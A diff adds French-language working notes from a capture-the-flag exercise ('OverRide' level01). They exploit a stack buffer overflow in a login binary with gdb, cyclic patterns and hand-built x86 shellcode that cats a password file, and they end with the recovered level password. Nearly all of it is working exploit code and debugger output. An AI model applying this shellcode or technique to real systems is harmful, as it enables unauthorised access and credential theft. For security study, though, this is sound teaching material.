@@ -1,0 +1,511 @@
+level01@OverRide:~$ ls
+level01
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: ethan
+verifying username....
+
+nope, incorrect username...
+
+level01@OverRide:~$ 
+
+➜  override git:(main) ✗ scp -P 4242 level01@192.168.1.28:/home/users/level01/level01 ./bin/.
+
+puis decompilation avec https://dogbolt.org/ 
+
+
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+admin
+nope, incorrect password...
+
+level01@OverRide:~$ 
+
+
+dans tout les cas le mdp seras incorrect
+et il ne se passe rien dans le cas ou le mdp serait bon
+
+
+essaie de connexion avec dat_wil || admin
+level01@OverRide:~$ su level02
+Password:
+su: Authentication failure
+
+  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
+et 
+  fgets(s, 100, stdin);
+
+donc on peut overflow s[64] avec fgets qui peut prendre 100 octets
+
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080484d0 <+0>:     push   %ebp
+   0x080484d1 <+1>:     mov    %esp,%ebp
+   0x080484d3 <+3>:     push   %edi
+   0x080484d4 <+4>:     push   %ebx
+   0x080484d5 <+5>:     and    $0xfffffff0,%esp
+   0x080484d8 <+8>:     sub    $0x60,%esp
+   0x080484db <+11>:    lea    0x1c(%esp),%ebx
+   0x080484df <+15>:    mov    $0x0,%eax
+   0x080484e4 <+20>:    mov    $0x10,%edx
+   0x080484e9 <+25>:    mov    %ebx,%edi
+   0x080484eb <+27>:    mov    %edx,%ecx
+   0x080484ed <+29>:    rep stos %eax,%es:(%edi)
+   0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
+   0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
+   0x080484fe <+46>:    call   0x8048380 <puts@plt>
+   0x08048503 <+51>:    mov    $0x80486df,%eax
+   0x08048508 <+56>:    mov    %eax,(%esp)
+   0x0804850b <+59>:    call   0x8048360 <printf@plt>
+   0x08048510 <+64>:    mov    0x804a020,%eax
+   0x08048515 <+69>:    mov    %eax,0x8(%esp)
+   0x08048519 <+73>:    movl   $0x100,0x4(%esp)
+   0x08048521 <+81>:    movl   $0x804a040,(%esp)
+   0x08048528 <+88>:    call   0x8048370 <fgets@plt>
+   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
+   0x08048532 <+98>:    mov    %eax,0x5c(%esp)
+   0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
+   0x0804853b <+107>:   je     0x8048550 <main+128>
+   0x0804853d <+109>:   movl   $0x80486f0,(%esp)
+   0x08048544 <+116>:   call   0x8048380 <puts@plt>
+   0x08048549 <+121>:   mov    $0x1,%eax
+   0x0804854e <+126>:   jmp    0x80485af <main+223>
+   0x08048550 <+128>:   movl   $0x804870d,(%esp)
+   0x08048557 <+135>:   call   0x8048380 <puts@plt>
+   0x0804855c <+140>:   mov    0x804a020,%eax
+   0x08048561 <+145>:   mov    %eax,0x8(%esp)
+   0x08048565 <+149>:   movl   $0x64,0x4(%esp)
+   0x0804856d <+157>:   lea    0x1c(%esp),%eax
+   0x08048571 <+161>:   mov    %eax,(%esp)
+   0x08048574 <+164>:   call   0x8048370 <fgets@plt>
+   0x08048579 <+169>:   lea    0x1c(%esp),%eax
+   0x0804857d <+173>:   mov    %eax,(%esp)
+   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
+   0x08048585 <+181>:   mov    %eax,0x5c(%esp)
+   0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
+   0x0804858e <+190>:   je     0x8048597 <main+199>
+   0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
+   0x08048595 <+197>:   je     0x80485aa <main+218>
+   0x08048597 <+199>:   movl   $0x804871e,(%esp)
+   0x0804859e <+206>:   call   0x8048380 <puts@plt>
+---Type <return> to continue, or q <return> to quit---
+   0x080485a3 <+211>:   mov    $0x1,%eax
+   0x080485a8 <+216>:   jmp    0x80485af <main+223>
+   0x080485aa <+218>:   mov    $0x0,%eax
+   0x080485af <+223>:   lea    -0x8(%ebp),%esp
+   0x080485b2 <+226>:   pop    %ebx
+   0x080485b3 <+227>:   pop    %edi
+   0x080485b4 <+228>:   pop    %ebp
+   0x080485b5 <+229>:   ret
+End of assembler dump.
+(gdb) break *0x080485b5
+Breakpoint 1 at 0x80485b5
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Breakpoint 1, 0x80485b5 in main ()
+(gdb) i r
+eax            0x1      1
+ecx            0xffffffff       -1
+edx            0xf7fd08b8       -134412104
+ebx            0x33634132       862142770
+esp            0xffffd70c       0xffffd70c
+ebp            0x63413563       0x63413563
+esi            0x0      0
+edi            0x41346341       1093952321
+eip            0x80485b5        0x80485b5 <main+229>
+eflags         0x286    [ PF SF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb) x/wx 0xffffd70c
+0xffffd70c:     0x37634136
+
+0x37634136 sur https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+offset = 80
+
+il nous faut creer un shellcode et la payload
+
+  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
+On sait que le buffer s est stocker a ebp-4Ch
+
+(gdb) b *0x080484fe
+Breakpoint 1 at 0x80484fe
+(gdb) run
+Starting program: /home/users/level01/level01
+
+Breakpoint 1, 0x080484fe in main ()
+(gdb) p/x $ebp - 0x4c
+$1 = 0xffffd6bc
+(gdb)
+
+
+level01:x:1001:1001:,,,:/home/users/level01:/bin/bash
+donc /home/users/level01/.pass
+
+on utilise https://masterccc.github.io/tools/shellcode_gen/
+
+avec /home/users/level01////.pass pour eviter les \00
+
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x31\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+
+auquel on ajoute \x31\xD2 pour initaliser EDX a 0
+https://defuse.ca/online-x86-assembler.htm#disassembly2
+Disassembly:
+0:  31 d2                   xor    edx,edx
+
+
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x31\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\x31\xD2\xcd\x80
+
+
+level01@OverRide:/tmp$ nano script.py
+
+level01@OverRide:~$ python /tmp/script.py | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+level01@OverRide:~$
+
+
+
+(gdb) b *0x080485b5
+Breakpoint 2 at 0x80485b5
+(gdb) run < <(python /tmp/script.py)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/users/level01/level01 < <(python /tmp/script.py)
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+
+Breakpoint 2, 0x080485b5 in main ()
+(gdb) i r
+eax            0x1      1
+ecx            0xffffffff       -1
+edx            0xf7fd08b8       -134412104
+ebx            0x31e18953       836864339
+esp            0xffffd70c       0xffffd70c
+ebp            0x80cdd231       0x80cdd231
+esi            0x0      0
+edi            0xbc083c0        197166016
+eip            0x80485b5        0x80485b5 <main+229>
+eflags         0x286    [ PF SF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb) x/wx 0xffffd70c
+0xffffd70c:     0xffffd6bc
+(gdb)
+
+(gdb) x/80xb 0xffffd6bc
+0xffffd6bc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd6c4:     0x90    0x90    0x90    0x90    0x90    0x31    0xc0    0x50
+0xffffd6cc:     0x68    0x2f    0x63    0x61    0x74    0x68    0x2f    0x62
+0xffffd6d4:     0x69    0x6e    0x89    0xe3    0x50    0x68    0x70    0x61
+0xffffd6dc:     0x73    0x73    0x68    0x2f    0x2f    0x2f    0x2e    0x68
+0xffffd6e4:     0x6c    0x30    0x31    0x2f    0x68    0x6c    0x65    0x76
+0xffffd6ec:     0x65    0x68    0x65    0x72    0x73    0x2f    0x68    0x65
+0xffffd6f4:     0x2f    0x75    0x73    0x68    0x2f    0x68    0x6f    0x6d
+0xffffd6fc:     0x01    0x00    0x00    0x00    0x53    0x89    0xe1    0x31
+0xffffd704:     0xc0    0x83    0xc0    0x0b    0x31    0xd2    0xcd    0x80
+(gdb) x/s 0xffffd6bc
+0xffffd6bc:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph/cath/bin\211\343Phpassh///.hl01/hlevehers/he/ush/hom\001"
+(gdb) x/35i 0xffffd6bc
+   0xffffd6bc:  nop
+=> 0xffffd6bd:  nop
+   0xffffd6be:  nop
+   0xffffd6bf:  nop
+   0xffffd6c0:  nop
+   0xffffd6c1:  nop
+   0xffffd6c2:  nop
+   0xffffd6c3:  nop
+   0xffffd6c4:  nop
+   0xffffd6c5:  nop
+   0xffffd6c6:  nop
+   0xffffd6c7:  nop
+   0xffffd6c8:  nop
+   0xffffd6c9:  xor    %eax,%eax
+   0xffffd6cb:  push   %eax
+   0xffffd6cc:  push   $0x7461632f
+   0xffffd6d1:  push   $0x6e69622f
+   0xffffd6d6:  mov    %esp,%ebx
+   0xffffd6d8:  push   %eax
+   0xffffd6d9:  push   $0x73736170
+   0xffffd6de:  push   $0x2e2f2f2f
+   0xffffd6e3:  push   $0x2f31306c
+   0xffffd6e8:  push   $0x6576656c
+   0xffffd6ed:  push   $0x2f737265
+   0xffffd6f2:  push   $0x73752f65
+   0xffffd6f7:  push   $0x6d6f682f
+   0xffffd6fc:  add    %eax,(%eax)
+   0xffffd6fe:  add    %al,(%eax)
+   0xffffd700:  push   %ebx
+   0xffffd701:  mov    %esp,%ecx
+   0xffffd703:  xor    %eax,%eax
+   0xffffd705:  add    $0xb,%eax
+   0xffffd708:  xor    %edx,%edx
+   0xffffd70a:  int    $0x80			<<< fin du shellcode
+   0xffffd70c:  mov    $0xffffd6,%esp
+(gdb)
+
+
+je cherche ou est le probleme dans mon shellcode :
+
+(gdb) stepi
+0xffffd6e3 in ?? ()
+(gdb) x/35i 0xffffd6bc
+   0xffffd6bc:  nop
+   0xffffd6bd:  nop
+   0xffffd6be:  nop
+   0xffffd6bf:  nop
+   0xffffd6c0:  nop
+   0xffffd6c1:  nop
+   0xffffd6c2:  nop
+   0xffffd6c3:  nop
+   0xffffd6c4:  nop
+   0xffffd6c5:  nop
+   0xffffd6c6:  nop
+   0xffffd6c7:  nop
+   0xffffd6c8:  nop
+   0xffffd6c9:  xor    %eax,%eax
+   0xffffd6cb:  push   %eax
+   0xffffd6cc:  push   $0x7461632f
+   0xffffd6d1:  push   $0x6e69622f
+   0xffffd6d6:  mov    %esp,%ebx
+   0xffffd6d8:  push   %eax
+   0xffffd6d9:  push   $0x73736170
+   0xffffd6de:  push   $0x2e2f2f2f
+=> 0xffffd6e3:  push   $0x2f31306c
+   0xffffd6e8:  push   $0x6576656c
+   0xffffd6ed:  push   $0x2f737265
+   0xffffd6f2:  push   $0x73752f65
+   0xffffd6f7:  push   $0x2e2f2f2f
+   0xffffd6fc:  jo     0xffffd75f
+   0xffffd6fe:  jae    0xffffd773
+   0xffffd700:  add    %al,(%eax)
+   0xffffd702:  add    %al,(%eax)
+   0xffffd704:  das
+   0xffffd705:  bound  %ebp,0x6e(%ecx)
+   0xffffd708:  das
+   0xffffd709:  arpl   %sp,0x74(%ecx)
+   0xffffd70c:  add    %al,(%eax)
+(gdb) stepi
+0xffffd6e8 in ?? ()
+(gdb) stepi
+0xffffd6ed in ?? ()
+(gdb) stepi
+0xffffd6f2 in ?? ()
+(gdb) stepi
+0xffffd759 in ?? ()
+(gdb) x/35i 0xffffd6bc
+   0xffffd6bc:  nop
+   0xffffd6bd:  nop
+   0xffffd6be:  nop
+   0xffffd6bf:  nop
+   0xffffd6c0:  nop
+   0xffffd6c1:  nop
+   0xffffd6c2:  nop
+   0xffffd6c3:  nop
+   0xffffd6c4:  nop
+   0xffffd6c5:  nop
+   0xffffd6c6:  nop
+   0xffffd6c7:  nop
+   0xffffd6c8:  nop
+   0xffffd6c9:  xor    %eax,%eax
+   0xffffd6cb:  push   %eax
+   0xffffd6cc:  push   $0x7461632f
+   0xffffd6d1:  push   $0x6e69622f
+   0xffffd6d6:  mov    %esp,%ebx
+   0xffffd6d8:  push   %eax
+   0xffffd6d9:  push   $0x73736170
+   0xffffd6de:  push   $0x2e2f2f2f
+   0xffffd6e3:  push   $0x2f31306c
+   0xffffd6e8:  push   $0x6576656c
+   0xffffd6ed:  jb     0xffffd75b
+   0xffffd6ef:  gs
+   0xffffd6f0:  insb   (%dx),%es:(%edi)
+   0xffffd6f1:  gs
+   0xffffd6f2:  jbe    0xffffd759
+   0xffffd6f4:  insb   (%dx),%es:(%edi)
+   0xffffd6f5:  xor    %dh,(%ecx)
+   0xffffd6f7:  das
+   0xffffd6f8:  das
+   0xffffd6f9:  das
+   0xffffd6fa:  das
+   0xffffd6fb:  jo,pn  0xffffd75f
+(gdb) stepi
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd759 in ?? ()
+(gdb)
+
+on passe de 0xffffd6f2 a 0xffffd759 
+
+et a 0xffffd6d1 le shellcode change 
+
+0xffffd6cc in ?? ()
+(gdb) x/35i 0xffffd6bc
+   0xffffd6bc:  nop
+   0xffffd6bd:  nop
+   0xffffd6be:  nop
+   0xffffd6bf:  nop
+   0xffffd6c0:  nop
+   0xffffd6c1:  nop
+   0xffffd6c2:  nop
+   0xffffd6c3:  nop
+   0xffffd6c4:  nop
+   0xffffd6c5:  nop
+   0xffffd6c6:  nop
+   0xffffd6c7:  nop
+   0xffffd6c8:  nop
+   0xffffd6c9:  xor    %eax,%eax
+   0xffffd6cb:  push   %eax
+=> 0xffffd6cc:  push   $0x7461632f
+   0xffffd6d1:  push   $0x6e69622f
+   0xffffd6d6:  mov    %esp,%ebx
+   0xffffd6d8:  push   %eax
+   0xffffd6d9:  push   $0x73736170
+   0xffffd6de:  push   $0x2e2f2f2f
+   0xffffd6e3:  push   $0x2f31306c
+   0xffffd6e8:  push   $0x6576656c
+   0xffffd6ed:  push   $0x2f737265
+   0xffffd6f2:  push   $0x73752f65
+   0xffffd6f7:  push   $0x6d6f682f
+   0xffffd6fc:  add    %eax,(%eax)
+   0xffffd6fe:  add    %al,(%eax)
+   0xffffd700:  push   %ebx
+   0xffffd701:  mov    %esp,%ecx
+   0xffffd703:  xor    %eax,%eax
+   0xffffd705:  add    $0xb,%eax
+   0xffffd708:  xor    %edx,%edx
+   0xffffd70a:  int    $0x80
+   0xffffd70c:  add    %al,(%eax)
+(gdb) stepi
+0xffffd6d1 in ?? ()
+(gdb) x/35i 0xffffd6bc
+   0xffffd6bc:  nop
+   0xffffd6bd:  nop
+   0xffffd6be:  nop
+   0xffffd6bf:  nop
+   0xffffd6c0:  nop
+   0xffffd6c1:  nop
+   0xffffd6c2:  nop
+   0xffffd6c3:  nop
+   0xffffd6c4:  nop
+   0xffffd6c5:  nop
+   0xffffd6c6:  nop
+   0xffffd6c7:  nop
+   0xffffd6c8:  nop
+   0xffffd6c9:  xor    %eax,%eax
+   0xffffd6cb:  push   %eax
+   0xffffd6cc:  push   $0x7461632f
+=> 0xffffd6d1:  push   $0x6e69622f
+   0xffffd6d6:  mov    %esp,%ebx
+   0xffffd6d8:  push   %eax
+   0xffffd6d9:  push   $0x73736170
+   0xffffd6de:  push   $0x2e2f2f2f
+   0xffffd6e3:  push   $0x2f31306c
+   0xffffd6e8:  push   $0x6576656c
+   0xffffd6ed:  push   $0x2f737265
+   0xffffd6f2:  push   $0x73752f65
+   0xffffd6f7:  push   $0x6d6f682f
+   0xffffd6fc:  add    %eax,(%eax)
+   0xffffd6fe:  add    %al,(%eax)
+   0xffffd700:  push   %ebx
+   0xffffd701:  mov    %esp,%ecx
+   0xffffd703:  xor    %eax,%eax
+   0xffffd705:  add    $0xb,%eax
+   0xffffd708:  das
+   0xffffd709:  arpl   %sp,0x74(%ecx)
+   0xffffd70c:  add    %al,(%eax)
+
+il n'y a plus:
+   0xffffd70a:  int    $0x80
+
+il y a un decallage au fill des push de mon shellcode mon shellcode
+	se fait overwrite par les pushs
+
+(gdb) i r esp
+esp            0xffffd710       0xffffd710
+(gdb) stepi
+0xffffd6cb in ?? ()
+(gdb) i r esp
+esp            0xffffd710       0xffffd710
+(gdb) stepi
+0xffffd6cc in ?? ()
+(gdb) i r esp
+esp            0xffffd70c       0xffffd70c
+(gdb) stepi
+0xffffd6d1 in ?? ()
+(gdb) i r esp
+esp            0xffffd708       0xffffd708
+(gdb) stepi
+0xffffd6d6 in ?? ()
+(gdb) i r esp
+esp            0xffffd704       0xffffd704
+(gdb)
+esp            0xffffd704       0xffffd704
+
+utilisation d'une var d'env
+
+level01@OverRide:/tmp$ nano script.py
+level01@OverRide:/tmp$ nano shellcode_gen.py
+level01@OverRide:/tmp$ nano get_env.c
+level01@OverRide:/tmp$ export shellcode=$(python shellcode_gen.py)
+level01@OverRide:/tmp$ env | grep shell
+shellcode=����������������������������������������1�Ph/cath/bin��Phpassh///.hl01/hlevehers/he/ush/hom��PQS��1���
+          1�̀
+level01@OverRide:/tmp$ gcc get_env.c
+level01@OverRide:/tmp$ ./a.out
+0x7fffffffeec1
+level01@OverRide:/tmp$ gcc -m32 get_env.c
+level01@OverRide:/tmp$ ./a.out
+0xffffdec1
+
+level01@OverRide:~$ python /tmp/script.py | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+/bin/cat: /home/users/level01////.pass: Permission denied
+level01@OverRide:~$
+
+rectification du shellcode level01->level02
+
+level01@OverRide:~$ python /tmp/script.py | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+level01@OverRide:~$
